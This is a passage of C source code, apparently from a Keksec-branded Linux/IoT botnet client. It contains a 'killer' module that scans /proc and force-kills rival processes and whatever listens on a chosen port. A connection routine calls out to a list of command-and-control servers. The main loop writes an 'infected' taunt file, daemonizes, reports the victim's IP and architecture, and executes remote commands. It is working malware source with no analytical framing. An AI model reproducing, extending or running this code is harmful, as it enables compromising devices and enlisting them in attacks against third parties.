            ptr_status_path += util_strcpy(ptr_status_path, "/proc/");
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, "/status");

            // Resolve exe_path (/proc/$pid/exe) -> realpath
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string

                // Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_j83j_match(exe_path))
            {
                kill(pid, 9);
            } 

            

            // Don't let others memory j83j!!!
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }
}

int killer_kill_by_port(int port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    fd = open("/proc/net/tcp", O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the HTONS port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            int in_column = 0;
            int listening_state = 0;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = 1;
                else
                {
                    if (in_column == 1)
                        column_index++;

                    if (in_column == 1 && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = 1;
                    }

                    in_column = 0;
                }
            }
            ii = i;

            if (listening_state == 0)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    if (util_strlen(inode) == 0) {
        return 0;
    }

    if ((dir = opendir("/proc/")) != NULL) {
        while ((entry = readdir(dir)) != NULL && ret == 0) {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/exe");

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, "/proc/");
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, "/proc/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/fd");
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    return ret;
}
int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, agagag[currentServer]);
        int port = 6982;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int main(int argc, unsigned char *argv[])
{       
        killer_xywz(getppid());
        FILE*fpd = fopen("KEKSEC.WAS.HERE", "w+");
        
        fprintf(fpd, "KEKSEC ON MF TOP\n");
        fprintf(fpd, "[ACID] You have been infected by urmommy there is a killer made by freak so good luck getting rid of this shit\n");
        fprintf(fpd, "Whitehats suck dick, Greyhats on top\n");
        
        
        printf("KEKSEC ON MF TOP\n");
        printf("[ACID] You have been infected by urmommy there is a killer made by freak so good luck getting rid of this shit\n");
        printf("Whitehats suck dick, Greyhats on top\n");
        if(SERVER_LIST_SIZE <= 0) return 0;

        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }
                sockprintf(mainCommSock, "\e[1;95mDevice Connected: %s | Port: %s | Arch: %s\e[0m", inet_ntoa(ourIP), getPortz(), getArch());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}
